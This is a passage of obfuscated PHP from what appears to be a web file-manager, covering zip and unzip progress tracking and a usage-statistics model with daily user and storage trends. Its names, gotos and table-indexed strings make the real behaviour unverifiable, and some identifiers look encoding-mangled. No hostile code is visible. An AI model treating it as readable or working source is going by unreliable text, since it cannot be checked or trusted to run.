Õ[$Dé¡İ·ˆ‘‚[1706]])) { $fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[1706]][$Dé¡İ·ˆ‘‚[557]] = $C½·ø²ºÜä[$fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[1706]][$Dé¡İ·ˆ‘‚[1501]]]; } } unset($fäá’¹Ú Õ); goto Dò¾ëÌ‡½ê; FÁÀâ†Ş: $Dé¡İ·ˆ‘‚ =& $_SERVER[Â€Á›¨õ]; $Eíƒƒ™Ê¼Ä = array_unique(array_to_keyvalue($C×‘Èç›©, $Dé¡İ·ˆ‘‚[33], $Dé¡İ·ˆ‘‚[1501])); $Eíƒƒ™Ê¼Ä = array_remove_value($Eíƒƒ™Ê¼Ä, $Dé¡İ·ˆ‘‚[491]); goto aùÁéöŒëÚ; aùÁéöŒëÚ: if (count($Eíƒƒ™Ê¼Ä) == 0) { return; } foreach ($C×‘Èç›© as $fäá’¹Ú Õ) { if (isset($fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[1706]])) { $Eíƒƒ™Ê¼Ä[] = $fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[1706]][$Dé¡İ·ˆ‘‚[1501]]; } } $C½·ø²ºÜä = Model($Dé¡İ·ˆ‘‚[501])->userListInfo($Eíƒƒ™Ê¼Ä); goto D´ğ‹¨ğäÁ; Dò¾ëÌ‡½ê: } private function _listAppendMeta(&$a¦­ë‚ Ô†) { goto DÕŞªÁèî”; FæìŠÃ›½®: if (!$eõ½Ì°ñ™§) { return !1; } foreach ($a¦­ë‚ Ô† as &$EÀñ–Ò“Ş) { $EÀñ–Ò“Ş[$E‚„©¯Âë [439]] = $eõ½Ì°ñ™§[$EÀñ–Ò“Ş[$E‚„©¯Âë [1703]]]; if (isset($EÀñ–Ò“Ş[$E‚„©¯Âë [1706]])) { $EÀñ–Ò“Ş[$E‚„©¯Âë [1706]][$E‚„©¯Âë [439]] = $eõ½Ì°ñ™§[$EÀñ–Ò“Ş[$E‚„©¯Âë [1706]][$E‚„©¯Âë [1703]]]; } } unset($EÀñ–Ò“Ş); goto fãÁ•¦—À; B¼¶Œ‹†–È: if (!$E´æ…¿ğì¨) { return; } foreach ($a¦­ë‚ Ô† as $EÀñ–Ò“Ş) { if (isset($EÀñ–Ò“Ş[$E‚„©¯Âë [1706]])) { $E´æ…¿ğì¨[] = $EÀñ–Ò“Ş[$E‚„©¯Âë [1706]][$E‚„©¯Âë [1703]]; } } $eõ½Ì°ñ™§ = $this->metaList($E´æ…¿ğì¨); goto FæìŠÃ›½®; DÕŞªÁèî”: $E‚„©¯Âë  =& $_SERVER[Â€Á›¨õ]; $E´æ…¿ğì¨ = array_unique(array_to_keyvalue($a¦­ë‚ Ô†, $E‚„©¯Âë [33], $E‚„©¯Âë [1703])); $E´æ…¿ğì¨ = array_remove_value($E´æ…¿ğì¨, $E‚„©¯Âë [491]); goto B¼¶Œ‹†–È; fãÁ•¦—À: } private function metaList($FœÚ«ŠãÔ) { goto c„ÍÑÆŠå; bÇï÷œ¸·Ú: $dÓ˜¥ŒÆò = Model($A…¯ºŒèÔ¿[1707])->where($a¬º«æ¢–‹)->select(); $dÓ˜¥ŒÆò = array_to_keyvalue_group($dÓ˜¥ŒÆò, $A…¯ºŒèÔ¿[1703]); foreach ($dÓ˜¥ŒÆò as $D³“Î¯»ëŠ => $F¯…ç©¥•) { $A»š¥½¥ = array(); foreach ($F¯…ç©¥• as $CøíÉ›‰ê¼) { $A»š¥½¥[$CøíÉ›‰ê¼[$A…¯ºŒèÔ¿[92]]] = $CøíÉ›‰ê¼[$A…¯ºŒèÔ¿[370]]; } $dÓ˜¥ŒÆò[$D³“Î¯»ëŠ] = $A»š¥½¥; } goto EÔ‘ÆóÅ¶±; EÔ‘ÆóÅ¶±: return $dÓ˜¥ŒÆò ? $dÓ˜¥ŒÆò : array(); goto E•É‹è’ˆ; c„ÍÑÆŠå: $A…¯ºŒèÔ¿ =& $_SERVER[Â€Á›¨õ]; if (!$FœÚ«ŠãÔ) { return array(); } $a¬º«æ¢–‹ = array($A…¯ºŒèÔ¿[1703] => array($A…¯ºŒèÔ¿[7], $FœÚ«ŠãÔ)); goto bÇï÷œ¸·Ú; E•É‹è’ˆ: } } goto D£Ë£ĞµØ›; b¶ÓÈã‰‚: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto F¬Ç¶Æ½æ; D•¦Ù½Ó—µ: if (!$CöÙ’ÃĞï[$f ç°Àë‘[1406]]) { $CöÙ’ÃĞï[$f ç°Àë‘[1406]] = LNG($f ç°Àë‘[1586]); } goto a›Œ“Ó™Êñ; e‡Í—ƒ‹ºØ: Hook::bind($f ç°Àë‘[1063], array($this, $f ç°Àë‘[1584])); $CöÙ’ÃĞï =& $this->task; $CöÙ’ÃĞï[$f ç°Àë‘[1585]] = $f ç°Àë‘[1068]; goto D•¦Ù½Ó—µ; F¬Ç¶Æ½æ: $f ç°Àë‘ =& $_SERVER[Â€Á›¨õ]; parent::startAfter(); Hook::bind($f ç°Àë‘[1582], array($this, $f ç°Àë‘[1583])); goto e‡Í—ƒ‹ºØ; a›Œ“Ó™Êñ: } protected function endAfter() { $b¶¡¹Òˆ†È =& $_SERVER[Â€Á›¨õ]; parent::endAfter(); Hook::unbind($b¶¡¹Òˆ†È[1582], array($this, $b¶¡¹Òˆ†È[1583])); Hook::unbind($b¶¡¹Òˆ†È[1063], array($this, $b¶¡¹Òˆ†È[1584])); } public function updateAfter() { $fĞ±ØãÛ¿Õ =& $_SERVER[Â€Á›¨õ]; $d±ñˆÚŒÏí =& $this->task; if (!$d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[996]] || !$d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[711]]) { return; } if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1585]] == $fĞ±ØãÛ¿Õ[1068]) { $B×ã¯îÄ = 0; if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1544]]) { $B×ã¯îÄ = $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1545]] / $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1544]]; } $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]] = $B×ã¯îÄ * 0.3; } else { if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1585]] == $fĞ±ØãÛ¿Õ[309]) { $B×ã¯îÄ = $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1010]] / $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[996]]; $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]] = 0.3 + $B×ã¯îÄ * 0.4; } else { if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1585]] == $fĞ±ØãÛ¿Õ[106]) { $fÑä§ã¾Ù = 0; if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1546]] == $fĞ±ØãÛ¿Õ[106]) { $fÑä§ã¾Ù = $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1545]]; } $B×ã¯îÄ = ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1549]] + $fÑä§ã¾Ù) / $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[711]]; $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]] = 0.3 + 0.4 + $B×ã¯îÄ * 0.3; } } } if ($d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]] > 0) { $a®ÑÒÁ “œ = timeFloat() - $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[733]] - $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1505]]; $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1506]] = $a®ÑÒÁ “œ * (1 - $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]]) / $d±ñˆÚŒÏí[$fĞ±ØãÛ¿Õ[1502]]; } } public function addFile($dÑ­İ‚‚Œ¼) { goto AØ»†Š¬õ; cãö–Ø×¥ø: $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[998]] = $c¹‡‘–Ãë[1561]; $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[1546]] = $c¹‡‘–Ãë[1068]; $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[711]] = $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[77]]; goto F«ôàŒ‰­Ş; AØ»†Š¬õ: $c¹‡‘–Ãë =& $_SERVER[Â€Á›¨õ]; $f‚–ª±Ç÷Š =& $this->task; $b¿ŠË‰ÂÆô = IO::info($dÑ­İ‚‚Œ¼); goto CÁ¥òíêÅ‹; d¦ğ¥òŞÒ: $this->update(); goto D’äÕ³˜é–; CÁ¥òíêÅ‹: $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[1542]] = $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[28]]; $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[1544]] = $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[77]]; $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[1545]] = 0; goto cãö–Ø×¥ø; F«ôàŒ‰­Ş: $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[996]] = 1; $E‰§¥¨‰ = 0; $f‚–ª±Ç÷Š[$c¹‡‘–Ãë[1553]] = array($c¹‡‘–Ãë[1554] => $E‰§¥¨‰ + 1, $c¹‡‘–Ãë[407] => $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[28]], $c¹‡‘–Ãë[75] => $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[75]], $c¹‡‘–Ãë[489] => $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[489]] ? $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[489]] : $b¿ŠË‰ÂÆô[$c¹‡‘–Ãë[75]]); goto d¦ğ¥òŞÒ; D’äÕ³˜é–: } public function unzipAfter($eêó†˜Â¥Ê) { goto fÀÑ…Ÿòó‚; fÀÑ…Ÿòó‚: $a”·´ôœì¼ =& $_SERVER[Â€Á›¨õ]; $F”ÅÕÍùÕ— =& $this->task; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1585]] = $a”·´ôœì¼[106]; goto fª¦¹Ù¹¥; e©°’Øƒ‹Œ: $this->update(); self::log($a”·´ôœì¼[1587] . json_encode(array($F”ÅÕÍùÕ—, $Dèƒàà»¬Ò))); goto dôÔî˜Ã®à; C¨ĞŸß”©Ã: $F”ÅÕÍùÕ—[$a”·´ôœì¼[1010]] = 0; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1544]] = 0; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1545]] = 0; goto bÄ†ë¦ÕÑ„; fª¦¹Ù¹¥: $Dèƒàà»¬Ò = IO::infoWithChildren($eêó†˜Â¥Ê); $B¶·ÔßõÌ = 0; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1553]] = array($a”·´ôœì¼[1554] => $B¶·ÔßõÌ + 1, $a”·´ôœì¼[407] => $Dèƒàà»¬Ò[$a”·´ôœì¼[28]], $a”·´ôœì¼[75] => $Dèƒàà»¬Ò[$a”·´ôœì¼[75]], $a”·´ôœì¼[489] => $Dèƒàà»¬Ò[$a”·´ôœì¼[489]] ? $Dèƒàà»¬Ò[$a”·´ôœì¼[489]] : $Dèƒàà»¬Ò[$a”·´ôœì¼[75]]); goto eé¾™·ô“ª; bÄ†ë¦ÕÑ„: $F”ÅÕÍùÕ—[$a”·´ôœì¼[1542]] = $a”·´ôœì¼[33]; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1549]] = 0; $F”ÅÕÍùÕ—[$a”·´ôœì¼[711]] = $Dèƒàà»¬Ò[$a”·´ôœì¼[77]]; goto e©°’Øƒ‹Œ; eé¾™·ô“ª: if ($Dèƒàà»¬Ò[$a”·´ôœì¼[29]] == $a”·´ôœì¼[173]) { $F”ÅÕÍùÕ—[$a”·´ôœì¼[996]] = 1; } else { $F”ÅÕÍùÕ—[$a”·´ôœì¼[996]] = $Dèƒàà»¬Ò[$a”·´ôœì¼[80]][$a”·´ôœì¼[78]]; } $F”ÅÕÍùÕ—[$a”·´ôœì¼[998]] = $a”·´ôœì¼[33]; $F”ÅÕÍùÕ—[$a”·´ôœì¼[1546]] = 0; goto C¨ĞŸß”©Ã; dôÔî˜Ã®à: } public function nameParse($eõ×Çë‘á¢) { goto C­›Ø™ˆÇ¢; C­›Ø™ˆÇ¢: $d²å¼öî¤† =& $_SERVER[Â€Á›¨õ]; $D”†–ÈºŒ =& $this->task; if ($D”†–ÈºŒ[$d²å¼öî¤†[1585]] == $d²å¼öî¤†[1068]) { $D”†–ÈºŒ[$d²å¼öî¤†[1585]] = $d²å¼öî¤†[309]; $D”†–ÈºŒ[$d²å¼öî¤†[1549]] = 0; $D”†–ÈºŒ[$d²å¼öî¤†[711]] = 0; } goto déÁ‡‘ëÜƒ; b‚ÎÊÁÏöã: $this->update(); goto e½‰§òÏÆ¯; déÁ‡‘ëÜƒ: $D¸Ö„±“¶¨ = get_path_this($eõ×Çë‘á¢); if (strstr($D¸Ö„±“¶¨, $d²å¼öî¤†[94])) { $D”†–ÈºŒ[$d²å¼öî¤†[1010]] += 1; $D”†–ÈºŒ[$d²å¼öî¤†[996]] += 1; } $D”†–ÈºŒ[$d²å¼öî¤†[1542]] = $eõ×Çë‘á¢; goto b‚ÎÊÁÏöã; e½‰§òÏÆ¯: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $FÄ°à„²¬ =& $_SERVER[Â€Á›¨õ]; parent::startAfter(); Hook::bind($FÄ°à„²¬[1588], array($this, $FÄ°à„²¬[1583])); $FÁÛˆù†’á =& $this->task; $FÁÛˆù†’á[$FÄ°à„²¬[1585]] = $FÄ°à„²¬[1068]; if (!$FÁÛˆù†’á[$FÄ°à„²¬[1406]]) { $FÁÛˆù†’á[$FÄ°à„²¬[1406]] = LNG($FÄ°à„²¬[1589]); } } protected function endAfter() { $b±¾­¦ùÖ‘ =& $_SERVER[Â€Á›¨õ]; parent::endAfter(); Hook::unbind($b±¾­¦ùÖ‘[1588], array($this, $b±¾­¦ùÖ‘[1583])); } public function updateAfter() { $FÏ«ñâë³ñ =& $_SERVER[Â€Á›¨õ]; $f‘â›ÉùŠ‡ =& $this->task; if (!$f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[996]] || !$f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[711]]) { return; } if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1585]] == $FÏ«ñâë³ñ[1068]) { $CéµÆ§”‘ = $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1545]]; if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1546]] != $FÏ«ñâë³ñ[1068]) { $CéµÆ§”‘ = 0; } $C¨Œí–Ë½ø = ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1549]] + $CéµÆ§”‘) / $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[711]]; $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]] = $C¨Œí–Ë½ø * 0.3; } else { if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1585]] == $FÏ«ñâë³ñ[309]) { $C¨Œí–Ë½ø = $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1010]] / $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[996]]; $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]] = 0.3 + $C¨Œí–Ë½ø * 0.5; } else { if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1585]] == $FÏ«ñâë³ñ[106]) { $C¨Œí–Ë½ø = 0; if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1544]]) { $C¨Œí–Ë½ø = $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1545]] / $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1544]]; } $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]] = 0.3 + 0.5 + $C¨Œí–Ë½ø * 0.2; } } } if ($f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]] > 0) { $c­’ğ´ÅÇ = timeFloat() - $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[733]] - $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1505]]; $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1506]] = $c­’ğ´ÅÇ * (1 - $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]]) / $f‘â›ÉùŠ‡[$FÏ«ñâë³ñ[1502]]; } } public function copyFileStart($e…Ö®™ˆó, $d•ÎÌ‹»Ñ, $Cæ ¢ˆÌÅÒ, $bØÄ“²±’¤, $EïİÜ×İòÔ, $Dİ‚ª‚Œ´ô) { $Dºõ¹†³‹ =& $_SERVER[Â€Á›¨õ]; parent::copyFileStart($e…Ö®™ˆó, $d•ÎÌ‹»Ñ, $Cæ ¢ˆÌÅÒ, $bØÄ“²±’¤, $EïİÜ×İòÔ, $Dİ‚ª‚Œ´ô); $AÔ„¢»á¹ =& $this->task; if ($AÔ„¢»á¹[$Dºõ¹†³‹[1585]] == $Dºõ¹†³‹[309]) { $AÔ„¢»á¹[$Dºõ¹†³‹[1585]] = $Dºõ¹†³‹[106]; } $this->update(); } public function copyFileEnd($A¾Œäåƒö, $F’ë¡º‰¼, $CŒÎ™â¬Ãğ, $A«ÙÂ«ò‘, $C’›¿İÑ¶Ë, $C§Ö¶µˆÖ) { $D‰Ì‚»˜Ô =& $_SERVER[Â€Á›¨õ]; $dö””É¿¨½ =& $this->task; $dö””É¿¨½[$D‰Ì‚»˜Ô[1545]] = $dö””É¿¨½[$D‰Ì‚»˜Ô[1544]]; $dö””É¿¨½[$D‰Ì‚»˜Ô[1549]] += $dö””É¿¨½[$D‰Ì‚»˜Ô[1544]]; $dö””É¿¨½[$D‰Ì‚»˜Ô[1546]] = $D‰Ì‚»˜Ô[33]; $this->update(); } public function nameParse($dˆÏÌ¾±¯ó) { $F±Ì³Ë›öæ =& $_SERVER[Â€Á›¨õ]; $FÊ’ç¼ÇÛ =& $this->task; if ($FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[1010]] < $FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[996]]) { $Fï¸Ã¾£²Û = get_path_this($dˆÏÌ¾±¯ó); if (strstr($Fï¸Ã¾£²Û, $F±Ì³Ë›öæ[94])) { $FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[1010]] += 1; } } if ($FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[1585]] == $F±Ì³Ë›öæ[1068]) { $FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[1585]] = $F±Ì³Ë›öæ[309]; } $FÊ’ç¼ÇÛ[$F±Ì³Ë›öæ[1542]] = $dˆÏÌ¾±¯ó; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($fÃ—…¤§¹˜) { $AùËêÂË¶‹ =& $_SERVER[Â€Á›¨õ]; $AèĞ“›Õ÷Ş = array($AùËêÂË¶‹[557] => array($AùËêÂË¶‹[29] => $AùËêÂË¶‹[1590], $AùËêÂË¶‹[269] => array($AùËêÂË¶‹[220], $AùËêÂË¶‹[713], $AùËêÂË¶‹[1591], $AùËêÂË¶‹[1592])), $AùËêÂË¶‹[1593] => array($AùËêÂË¶‹[29] => $AùËêÂË¶‹[1594], $AùËêÂË¶‹[269] => array($AùËêÂË¶‹[220], $AùËêÂË¶‹[711], $AùËêÂË¶‹[1595], $AùËêÂË¶‹[1596], $AùËêÂË¶‹[1597]))); if (!isset($AèĞ“›Õ÷Ş[$fÃ—…¤§¹˜])) { return !1; } $this->optionType = $AèĞ“›Õ÷Ş[$fÃ—…¤§¹˜][$AùËêÂË¶‹[29]]; $this->field = $AèĞ“›Õ÷Ş[$fÃ—…¤§¹˜][$AùËêÂË¶‹[269]]; return !0; } public function listData($f‰õí¿ÈÂ¯ = false, $BÇ“ôø„³ã = "\155\x6f\144\151\146\x79\124\151\155\145", $d£µÇñ÷× = false) { return parent::listData($f‰õí¿ÈÂ¯, $BÇ“ôø„³ã, $d£µÇñ÷×); } public function trendList($c¦™…ºœµÕ) { goto EË¬è¶á´ù; dÑªšøªé«: if (!isset($cì‡ë²õ¹Œ)) { $C¥›–„ß = $c¦™…ºœµÕ == $f¼®÷ˆ‚¨†[557] ? $f¼®÷ˆ‚¨†[501] : $f¼®÷ˆ‚¨†[767]; $cì‡ë²õ¹Œ = Model($C¥›–„ß)->min($f¼®÷ˆ‚¨†[192]); } $bäõª´ƒ“ = $f¼®÷ˆ‚¨†[1600] . ucfirst($c¦™…ºœµÕ); $aé·¡Á¥„‡ = $this->dateList($cì‡ë²õ¹Œ); goto e¼É‡ˆ¯ëè; EË¬è¶á´ù: $f¼®÷ˆ‚¨† =& $_SERVER[Â€Á›¨õ]; $d“³Ù§½· = $this->listData(); if ($d“³Ù§½·) { $CÌÛ®Ü¦©¯ = end($d“³Ù§½·); $BÃøÛìˆ¾½ = date($f¼®÷ˆ‚¨†[1598], strtotime($f¼®÷ˆ‚¨†[1599])); if ($CÌÛ®Ü¦©¯[$f¼®÷ˆ‚¨†[220]] == $BÃøÛìˆ¾½) { return $d“³Ù§½·; } $cì‡ë²õ¹Œ = strtotime($CÌÛ®Ü¦©¯[$f¼®÷ˆ‚¨†[220]]); } goto dÑªšøªé«; e¼É‡ˆ¯ëè: foreach ($aé·¡Á¥„‡ as $BÃøÛìˆ¾½) { $this->{$bäõª´ƒ“}($BÃøÛìˆ¾½); } return $this->listData(); goto A¾Ÿ…½í‰; A¾Ÿ…½í‰: } private function dateList($E«‰å­¸Üğ) { $d„µéçØˆÚ =& $_SERVER[Â€Á›¨õ]; $DˆÆÁÅÔÀ¸ = $E«‰å­¸Üğ; $bù«µà±Ö† = strtotime($d„µéçØˆÚ[1599]); $cÄ…ñí¯Ì = array(); while ($DˆÆÁÅÔÀ¸ <= $bù«µà±Ö†) { $cÄ…ñí¯Ì[] = date($d„µéçØˆÚ[1598], $DˆÆÁÅÔÀ¸); $DˆÆÁÅÔÀ¸ = strtotime($d„µéçØˆÚ[1601], $DˆÆÁÅÔÀ¸); } return $cÄ…ñí¯Ì; } public function _recordUser($e¤«±Ù¶œµ = '') { goto cÜºˆ¾â£; cÜºˆ¾â£: $c…ùöá£º’ =& $_SERVER[Â€Á›¨õ]; $e•×÷ñæä­ = strtotime(date($c…ùöá£º’[1602], strtotime($e¤«±Ù¶œµ))); $B»ÌÇ˜…ç = strtotime(date($c…ùöá£º’[1603], strtotime($e¤«±Ù¶œµ))); goto cÁÁîòÓ§Å; cÁÁîòÓ§Å: $aˆ†¶„âë² = array($c…ùöá£º’[192] => array($c…ùöá£º’[945], $B»ÌÇ˜…ç)); $fÙÚ¦ŞÇ™ = Model($c…ùöá£º’[501])->where($aˆ†¶„âë²)->count($c…ùöá£º’[1501]); $aˆ†¶„âë²[$c…ùöá£º’[192]] = array($c…ùöá£º’[329], array($e•×÷ñæä­, $B»ÌÇ˜…ç)); goto F®Øøé»; b˜—ã­‘Ëº: $FêÚÉâìïÕ = array($c…ùöá£º’[220] => $e¤«±Ù¶œµ, $c…ùöá£º’[713] => (int) $fÙÚ¦ŞÇ™, $c…ùöá£º’[1591] => (int) $A®² Ö×Ÿ, $c…ùöá£º’[1592] => (int) $cÜ‡¾ÛâÑø); return $this->insert($FêÚÉâìïÕ); goto cÂƒæØô›; F®Øøé»: $A®² Ö×Ÿ = Model($c…ùöá£º’[501])->where($aˆ†¶„âë²)->count($c…ùöá£º’[1501]); $aˆ†¶„âë²[$c…ùöá£º’[29]] = $c…ùöá£º’[1604]; $cÜ‡¾ÛâÑø = Model($c…ùöá£º’[1605])->where($aˆ†¶„âë²)->count($c…ùöá£º’[1606]); goto b˜—ã­‘Ëº; cÂƒæØô›: } public function _recordStore($FÀ®¤î‰áĞ = '') { goto fæíÆö»İÜ; CŠ¸å³â¡: $AŠ¾½äÁ = Model($e‚ÖÖõŠŠ[444])->where($BŠ½¼»ñë)->sum($e‚ÖÖõŠŠ[77]); $BŠ½¼»ñë[$e‚ÖÖõŠŠ[397]] = 0; $DáÍáğÎ‡Ú = Model($e‚ÖÖõŠŠ[767])->where($BŠ½¼»ñë)->sum($e‚ÖÖõŠŠ[77]); goto EÈ¾×Ğƒ§õ; aö½İ›…Å: $eŠÒ®·ë = Model($e‚ÖÖõŠŠ[767])->where($BŠ½¼»ñë)->sum($e‚ÖÖõŠŠ[77]); $c¡ÜƒÛè­Æ = array($e‚ÖÖõŠŠ[220] => $FÀ®¤î‰áĞ, $e‚ÖÖõŠŠ[711] => (int) $DáÍáğÎ‡Ú, $e‚ÖÖõŠŠ[1595] => (int) $AŠ¾½äÁ, $e‚ÖÖõŠŠ[1596] => (int) $EÕ§“’¾Á, $e‚ÖÖõŠŠ[1597] => (int) $eŠÒ®·ë); return $this->insert($c¡ÜƒÛè­Æ); goto A¶ŞîŸÓéÌ; EÈ¾×Ğƒ§õ: $BŠ½¼»ñë[$e‚ÖÖõŠŠ[398]] = 1; $EÕ§“’¾Á = Model($e‚ÖÖõŠŠ[767])->where($BŠ½¼»ñë)->sum($e‚ÖÖõŠŠ[77]); $BŠ½¼»ñë[$e‚ÖÖõŠŠ[398]] = 2; goto aö½İ›…Å; fæíÆö»İÜ: $e‚ÖÖõŠŠ =& $_SERVER[Â€Á›¨õ]; $DÌİ¤êçï = strtotime(date($e‚ÖÖõŠŠ[1603], strtotime($FÀ®¤î‰áĞ))); $BŠ½¼»ñë = array($e‚ÖÖõŠŠ[192] => array($e‚ÖÖõŠŠ[945], $DÌİ¤êçï)); goto CŠ¸å³â¡; A¶ŞîŸÓéÌ: } public function trend($B§™Ü©·¶, $Bæéà¶Œ¬Ï) { goto DˆÕ…ÙøÄ¤; Dï¸¥ ·Ğù: if ($C¸®Ùèƒãê && $Bæéà¶Œ¬Ï != $E‡¦ÙŠ™â[1475]) { $F™ƒ‹Ù´® = $C¸®Ùèƒãê[0][$E‡¦ÙŠ™â[220]]; $Cé„¤‰ÆÀ = $this->validDate($Bæéà¶Œ¬Ï, $F™ƒ‹Ù´®); $aÖŒåñÒêğ = array(); $FååÇŸ–¥³ = array_to_keyvalue($C¸®Ùèƒãê, $E‡¦ÙŠ™â[220]); foreach ($Cé„¤‰ÆÀ as $A™ìÇƒÌ‡è) { if (isset($FååÇŸ–¥³[$A™ìÇƒÌ‡è])) { $a¼àãÜ‘§ß = $FååÇŸ–¥³[$A™ìÇƒÌ‡è]; } else { $a¼àãÜ‘§ß = end($C¸®Ùèƒãê); $a¼àãÜ‘§ß[$E‡¦ÙŠ™â[220]] = $A™ìÇƒÌ‡è; if ($B§™Ü©·¶ == $E‡¦ÙŠ™â[557]) { $a¼àãÜ‘§ß[$E‡¦ÙŠ™â[1591]] = $a¼àãÜ‘§ß[$E‡¦ÙŠ™â[1592]] = 0; } } $aÖŒåñÒêğ[] = $a¼àãÜ‘§ß; } $C¸®Ùèƒãê = $aÖŒåñÒêğ; } $fóÇ”œ¬„¤ = array($E‡¦ÙŠ™â[557] => array($E‡¦ÙŠ™â[713] => LNG($E‡¦ÙŠ™â[1607]), $E‡¦ÙŠ™â[1591] => LNG($E‡¦ÙŠ™â[1608]), $E‡¦ÙŠ™â[1592] => LNG($E‡¦ÙŠ™â[1609])), $E‡¦ÙŠ™â[1593] => array($E‡¦ÙŠ™â[711] => LNG($E‡¦ÙŠ™â[1610]), $E‡¦ÙŠ™â[1595] => LNG($E‡¦ÙŠ™â[1611]), $E‡¦ÙŠ™â[1596] => LNG($E‡¦ÙŠ™â[1612]), $E‡¦ÙŠ™â[1597] => LNG($E‡¦ÙŠ™â[1613]))); $D®·Šôß÷ = array($E‡¦ÙŠ™â[557] => $E‡¦ÙŠ™â[1614], $E‡¦ÙŠ™â[1593] => $E‡¦ÙŠ™â[77]); goto EÉ½òÓñ™¢; EÉ½òÓñ™¢: if (empty($C¸®Ùèƒãê)) { $A™ìÇƒÌ‡è = date($E‡¦ÙŠ™â[1598], strtotime($E‡¦ÙŠ™â[1599])); $aø„¶ğ˜ŒÜ = array($E‡¦ÙŠ™â[220] => $A™ìÇƒÌ‡è); foreach ($fóÇ”œ¬„¤[$B§™Ü©·¶] as $f¼ˆïãÑ => $eëŠ§Œ) { $aø„¶ğ˜ŒÜ[$f¼ˆïãÑ] = 0; } $C¸®Ùèƒãê[] = $aø„¶ğ˜ŒÜ; } $AÈÀ‹±¶² = array(); foreach ($C¸®Ùèƒãê as $eëŠ§Œ) { if ($B§™Ü©·¶ == $E‡¦ÙŠ™â[1593] && $eëŠ§Œ[$E‡¦ÙŠ™â[1595]] > $eëŠ§Œ[$E‡¦ÙŠ™â[711]]) { $eëŠ§Œ[$E‡¦ÙŠ™â[1595]] = $eëŠ§Œ[$E‡¦ÙŠ™â[711]]; } foreach ($fóÇ”œ¬„¤[$B§™Ü©·¶] as $f¼ˆïãÑ => $eªé³áÙÕÆ) { $a¼àãÜ‘§ß = array($E‡¦ÙŠ™â[220] => $eëŠ§Œ[$E‡¦ÙŠ™â[220]], $E‡¦ÙŠ™â[1406] => $eªé³áÙÕÆ); $a¼àãÜ‘§ß[$D®·Šôß÷[$B§™Ü©·¶]] = isset($eëŠ§Œ[$f¼ˆïãÑ]) ? $eëŠ§Œ[$f¼ˆïãÑ] : 0; $AÈÀ‹±¶²[] = $a¼àãÜ‘§ß; } } goto f•˜Ş°ğ; f•˜Ş°ğ: return $AÈÀ‹±¶²; goto e›ĞÑİÖ¶ƒ; DˆÕ…ÙøÄ¤: 